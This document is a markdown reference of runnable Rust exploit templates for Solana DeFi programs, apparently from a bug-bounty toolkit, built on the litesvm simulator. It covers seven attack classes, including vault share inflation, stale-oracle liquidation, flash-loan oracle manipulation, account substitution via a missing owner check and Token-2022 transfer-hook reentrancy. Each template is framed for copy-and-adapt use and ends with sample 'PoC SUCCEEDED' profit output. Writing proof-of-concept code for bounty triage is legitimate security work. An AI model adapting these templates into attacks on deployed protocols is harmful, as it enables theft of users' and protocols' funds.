# Attack Templates — Per-Class Runnable PoC Skeletons

For each major bug class from `solana-exploiter`, this file provides a runnable PoC skeleton in litesvm. Copy, replace placeholders, run.

These are scaffolds. Specifics depend on the target. But the structure is portable.

---

## Template 1 — CLMM tick array desync (KyberSwap class)

```rust
use litesvm::LiteSVM;
use solana_sdk::{pubkey::Pubkey, signature::Keypair, signer::Signer, transaction::Transaction};

fn main() {
    let mut svm = LiteSVM::new();
    let clmm_id = Pubkey::from_str("PROGRAM_ID").unwrap();
    svm.add_program(clmm_id, include_bytes!("../target.so"));
    
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 100_000_000_000).unwrap();
    
    // Setup pool with attacker-controlled liquidity in specific tick range
    let pool = setup_pool(&mut svm, clmm_id, &attacker);
    
    // Attacker's first position: liquidity at tick range [-100, 100]
    let position_1 = open_position(&mut svm, &attacker, &pool, -100, 100, 1_000_000);
    
    // Capture before-state
    let fee_growth_global_before = read_pool(&svm, &pool).fee_growth_global_a;
    
    // Step 1: Trigger a swap that crosses tick 0, generating fees on the active range
    swap_tokens(&mut svm, &pool, 100_000); // amount_in
    
    let fee_growth_global_after = read_pool(&svm, &pool).fee_growth_global_a;
    println!("Fee growth: {} -> {}", fee_growth_global_before, fee_growth_global_after);
    
    // Step 2: HYPOTHESIS — call collect_fees on position with manipulated tick array
    // Goal: cause fee_growth_inside calculation to use stale checkpoint
    
    // Construct a sparse tick array where tick at boundary is "uninitialized"
    // Real position's range is [-100, 100], but we'll provide a tick array that lies
    let manipulated_tick_array = construct_sparse_tick_array(&mut svm, -100, 100);
    
    // Call collect_fees with manipulated tick array
    let result = collect_fees_with_array(&mut svm, &attacker, &position_1, &manipulated_tick_array);
    
    // Step 3: Verify exploit: fees collected should exceed fees actually generated for this range
    let fees_collected = read_attacker_fee_balance(&svm, &attacker);
    let fees_expected = compute_expected_fees(fee_growth_global_after - fee_growth_global_before, 1_000_000);
    
    println!("Fees collected: {}", fees_collected);
    println!("Fees expected: {}", fees_expected);
    println!("Excess (bug): {}", fees_collected as i64 - fees_expected as i64);
    
    assert!(fees_collected > fees_expected * 2, "Tick array desync didn't multiply fees");
    println!("PoC succeeded: collected 2x+ expected fees via tick array manipulation");
}
```

---

## Template 2 — Vault share inflation (first depositor donation)

See `litesvm-deep.md` for full inflation attack PoC. Key structure:

```rust
fn main() {
    let mut svm = LiteSVM::new();
    // ... setup ...
    
    // Step 1: Attacker first deposit (minimum unit)
    deposit(&mut svm, &attacker, &vault, 1);
    
    // Step 2: Attacker donates to vault's underlying ATA directly (bypass deposit)
    direct_transfer(&mut svm, &attacker, &vault.underlying_ata, large_amount);
    
    // Step 3: Victim deposits, gets 0 or 1 share due to rounding
    deposit(&mut svm, &victim, &vault, victim_amount);
    let victim_shares = read_shares(&svm, &victim);
    assert!(victim_shares == 0 || victim_shares == 1, "Inflation didn't trigger");
    
    // Step 4: Attacker withdraws single share, captures vault's value
    withdraw(&mut svm, &attacker, &vault, attacker_shares);
    
    let extracted = read_balance(&svm, &attacker_underlying);
    assert!(extracted > victim_amount * 80 / 100, "Less than 80% extraction");
}
```

---

## Template 3 — Oracle staleness liquidation

```rust
fn main() {
    let mut svm = LiteSVM::new();
    let lending_id = Pubkey::from_str("PROGRAM_ID").unwrap();
    svm.add_program(lending_id, include_bytes!("../lending.so"));
    
    let attacker = Keypair::new();
    let victim = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    svm.airdrop(&victim.pubkey(), 10_000_000_000).unwrap();
    
    // Setup: oracle starts at $100 for collateral asset
    let oracle = setup_oracle(&mut svm, 100_00000000, -8); // $100, expo -8
    let reserve = setup_reserve(&mut svm, lending_id, oracle);
    
    // Victim opens position: 10 collateral ($1000) borrows 800 of stablecoin
    open_position(&mut svm, &victim, &reserve, 10, 800);
    
    // Step 1: Real market price drops to $80 (real-time)
    // But oracle hasn't updated; oracle still shows $100
    
    // Step 2: Time passes (oracle now stale)
    let mut clock = svm.get_clock();
    clock.unix_timestamp += 600; // 10 minutes pass
    svm.set_sysvar(&clock);
    
    // Step 3: Attacker liquidates victim
    // At real price ($80), victim's position is liquidatable: 10 * 80 = $800 of collateral, $800 borrow → 100% LTV
    // At stale price ($100), liquidator's bonus is computed on $100 valuation
    // If protocol allows liquidation at stale price:
    //   - Pays back 50% of $800 = $400
    //   - Receives 5 collateral × 1.05 = 5.25 collateral
    //   - At real price, that's worth 5.25 × $80 = $420 (more than $400 paid)
    //   - But attack works because protocol thinks 5.25 collateral = $525 (overpaying victim, costing protocol)
    
    let attacker_balance_before = read_balance(&svm, &attacker.pubkey());
    liquidate(&mut svm, &attacker, &victim, &reserve);
    let attacker_balance_after = read_balance(&svm, &attacker.pubkey());
    
    let extracted = attacker_balance_after - attacker_balance_before;
    println!("Liquidator extracted: {}", extracted);
    
    // Verify: liquidator received more value than they paid (with real prices)
    assert!(extracted > 0, "Stale oracle liquidation didn't profit");
    println!("PoC succeeded: stale oracle allowed extraction of {}", extracted);
}
```

---

## Template 4 — Flash loan asymmetry

```rust
fn main() {
    let mut svm = LiteSVM::new();
    let lending_id = Pubkey::from_str("PROGRAM_ID").unwrap();
    let amm_id = Pubkey::from_str("AMM_ID").unwrap();
    svm.add_program(lending_id, include_bytes!("../lending.so"));
    svm.add_program(amm_id, include_bytes!("../amm.so"));
    
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();
    
    let usdc = setup_token(&mut svm, "USDC");
    let sol_oracle = setup_oracle(&mut svm, 100_00000000, -8); // $100/SOL
    
    let lending_reserve = setup_lending(&mut svm, lending_id, usdc);
    let amm_pool = setup_amm(&mut svm, amm_id, /* USDC <-> SOL */);
    
    // Attacker has tiny initial position
    let attacker_usdc = create_ata_and_mint(&mut svm, &usdc, &attacker.pubkey(), 1_000, /* authority */);
    
    // Build single-tx attack:
    // 1. Flash loan 1B USDC from lending
    // 2. Swap into AMM, moving SOL price
    // 3. Trigger oracle update on SOL price (now manipulated)
    // 4. Open large position on lending using SOL as collateral at manipulated price
    // 5. Borrow USDC against fake collateral
    // 6. Repay flash loan
    // 7. Walk away with USDC
    
    let ix1 = flash_borrow_ix(&attacker, &lending_reserve, 1_000_000_000_000); // 1B USDC
    let ix2 = swap_ix(&attacker, &amm_pool, 1_000_000_000_000, /* USDC -> SOL */);
    let ix3 = update_oracle_ix(&sol_oracle); // if oracle reads from AMM TWAP
    let ix4 = deposit_ix(&attacker, &lending_reserve, &sol_collateral_account);
    let ix5 = borrow_ix(&attacker, &lending_reserve, 800_000_000_000); // borrow USDC
    let ix6 = swap_ix(&attacker, &amm_pool, /* SOL -> USDC, reverse */);
    let ix7 = flash_repay_ix(&attacker, &lending_reserve, 1_000_000_000_000);
    
    let tx = Transaction::new_signed_with_payer(
        &[ix1, ix2, ix3, ix4, ix5, ix6, ix7],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    
    let result = svm.send_transaction(tx);
    
    let attacker_balance_after = read_token_balance(&svm, &attacker_usdc);
    println!("Attacker USDC after: {}", attacker_balance_after);
    
    assert!(attacker_balance_after > 1_000, "Flash loan attack didn't profit");
}
```

This is generic — actual flash loan + AMM + oracle structure depends on target.

---

## Template 5 — Account substitution (missing has_one)

```rust
fn main() {
    let mut svm = LiteSVM::new();
    let target_id = Pubkey::from_str("PROGRAM_ID").unwrap();
    svm.add_program(target_id, include_bytes!("../target.so"));
    
    let victim = Keypair::new();
    let attacker = Keypair::new();
    svm.airdrop(&victim.pubkey(), 10_000_000_000).unwrap();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    
    // Step 1: Victim creates a position with valuable state
    let victim_position = open_position(&mut svm, &victim, /* params */);
    let victim_position_value_before = read_position_value(&svm, &victim_position);
    println!("Victim position value: {}", victim_position_value_before);
    
    // Step 2: Attacker creates their own position
    let attacker_position = open_position(&mut svm, &attacker, /* params */);
    
    // Step 3: Attacker calls "withdraw" or "modify" handler with:
    //   - position = victim's position (read-target)
    //   - user = attacker (signer)
    //   - other accounts as required
    // If handler's has_one or signer-vs-position-owner check is missing, succeeds
    
    let ix = build_withdraw_ix(
        &target_id,
        &attacker.pubkey(),    // signer
        &victim_position,      // BUT we pass victim's position
        /* other accounts */
    );
    
    let tx = Transaction::new_signed_with_payer(&[ix], Some(&attacker.pubkey()), &[&attacker], svm.latest_blockhash());
    let result = svm.send_transaction(tx);
    
    match result {
        Ok(_) => {
            let attacker_balance = read_balance(&svm, &attacker.pubkey());
            let victim_position_value_after = read_position_value(&svm, &victim_position);
            println!("Attacker balance: {}", attacker_balance);
            println!("Victim position value after: {}", victim_position_value_after);
            assert!(attacker_balance > 0, "No funds extracted");
            println!("PoC succeeded: attacker withdrew from victim's position");
        }
        Err(e) => {
            println!("Tx failed (which means the bug isn't there): {:?}", e);
            panic!("Hypothesis was wrong - protocol blocks substitution");
        }
    }
}
```

---

## Template 6 — Two-handler invariant desync

```rust
fn main() {
    // Setup protocol
    let mut svm = LiteSVM::new();
    // ... setup state where invariant X holds ...
    
    // Capture invariant value
    let invariant_before = compute_invariant(&svm);
    println!("Invariant before: {}", invariant_before);
    
    // Call handler B (which mutates field X but doesn't update field Y)
    call_handler_b(&mut svm, params_b);
    
    // Call handler A (which reads X to update Y) -- BUT now X is out of sync
    call_handler_a(&mut svm, params_a);
    
    // Capture invariant after
    let invariant_after = compute_invariant(&svm);
    println!("Invariant after: {}", invariant_after);
    
    // Verify invariant is broken
    assert_ne!(invariant_before, invariant_after, "Invariant didn't drift");
    println!("Invariant drift detected: {} -> {}", invariant_before, invariant_after);
    
    // Step 2: Exploit the drift to extract value
    // Often: drift creates a state where withdrawing reads wrong amount
    let extracted = withdraw_against_drifted_state(&mut svm);
    println!("Extracted from drift: {}", extracted);
    assert!(extracted > 0);
}
```

The key insight: PoC must show:
1. Invariant value before handler B.
2. Invariant value after handler B + handler A (drift).
3. Extraction enabled by the drift.

---

## Template 7 — Token-2022 transfer hook reentrancy

```rust
fn main() {
    let mut svm = LiteSVM::new();
    let target_id = Pubkey::from_str("VictimProgramId").unwrap();
    let hook_id = Pubkey::from_str("MyEvilHookProgram").unwrap();
    
    svm.add_program(target_id, include_bytes!("../target.so"));
    svm.add_program(hook_id, include_bytes!("../my_evil_hook.so"));
    
    // Step 1: Create Token-2022 mint with my evil program as transfer hook
    let mint = create_token_2022_mint_with_hook(&mut svm, hook_id);
    
    // Step 2: Victim deposits into target program using this token
    deposit_into_target(&mut svm, &victim, &mint, amount);
    
    // Step 3: My evil hook's "execute" function:
    //   - Detects when victim is mid-deposit
    //   - Calls back into target's withdraw function with attacker's identity
    //   - Returns success to original transfer
    
    // Step 4: After tx completes, attacker has both:
    //   - Victim's deposit (because hook stole it during deposit's CPI)
    //   - Their own original tokens
    
    let attacker_balance = read_balance(&svm, &attacker);
    assert!(attacker_balance > expected_baseline);
}
```

This requires writing the evil hook program separately. See `attack-hook.rs` companion file.

---

## How to use templates

1. Identify which class your hypothesis falls into.
2. Copy the matching template.
3. Replace the placeholder calls (setup, attack, verify) with target-specific functions.
4. Build target-specific helpers (open_position, deposit, etc.) by reading the target's instruction set.
5. Run, iterate.

If template doesn't match cleanly, you may have a novel class — write a custom PoC structure, but follow the same pattern: setup, attack, verify with concrete numbers.

## What "good" templates produce

Output should be:
```
=== Initial state ===
Attacker collateral: 1000000
Victim balance: 50000000
Pool TVL: 100000000

=== Attack execution ===
Tx 1: flash loan succeeded
Tx 2: swap moved oracle from $100 to $145
Tx 3: liquidation succeeded, captured 5.25x of paid-back amount

=== Final state ===
Attacker collateral: 1850000
Victim balance: 0 (liquidated)
Pool TVL: 49150000

=== Result ===
Attacker net profit: 850000
Protocol loss: 50850000

PoC SUCCEEDED.
```

This is what the triager wants to see.
